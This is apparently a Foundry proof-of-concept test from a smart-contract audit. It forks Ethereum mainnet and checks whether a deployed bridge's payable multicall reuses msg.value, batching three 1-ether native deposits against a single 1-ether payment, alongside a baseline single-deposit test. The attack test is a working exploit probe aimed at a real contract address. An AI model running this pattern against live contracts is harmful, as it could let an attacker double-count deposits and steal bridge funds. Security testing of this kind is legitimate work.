// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "forge-std/Test.sol";

interface ILB {
    function teleportAsset(address _token, uint256 _amount, uint32 _toChainId) external payable;
    function multicall(bytes[] calldata data) external returns (bytes[] memory);
    function totalDeposits(uint256) external view returns (uint256);
    function paused() external view returns (bool);
}

contract LBTest is Test {
    address constant LB = 0x2dE73Bd1660Fbf4D521a52Ec2a91CCc106113801; // ETH proxy
    uint32 constant DST = 288; // Boba, native supported, min .01 max 2 daily 6
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC"));
        vm.deal(attacker, 100 ether);
    }

    // H-S4: payable-multicall msg.value reuse for native double-count
    function test_multicall_native_reuse() public {
        uint256 before = ILB(LB).totalDeposits(DST);
        bytes memory call1 = abi.encodeWithSelector(ILB.teleportAsset.selector, address(0), 1 ether, DST);
        bytes[] memory batch = new bytes[](3);
        batch[0] = call1; batch[1] = call1; batch[2] = call1;
        vm.prank(attacker);
        // send 1 ether, try to register 3 deposits of 1 ether
        (bool ok, bytes memory ret) = LB.call{value: 1 ether}(abi.encodeWithSelector(ILB.multicall.selector, batch));
        emit log_named_uint("multicall success(1=yes)", ok ? 1 : 0);
        if (!ok) emit log_named_bytes("revert", ret);
        uint256 aft = ILB(LB).totalDeposits(DST);
        emit log_named_uint("deposits registered", aft - before);
        emit log_named_uint("attacker eth left", attacker.balance);
    }

    // baseline: single native deposit works
    function test_single_native_deposit() public {
        uint256 before = ILB(LB).totalDeposits(DST);
        vm.prank(attacker);
        ILB(LB).teleportAsset{value: 1 ether}(address(0), 1 ether, DST);
        emit log_named_uint("deposits delta", ILB(LB).totalDeposits(DST) - before);
    }
}
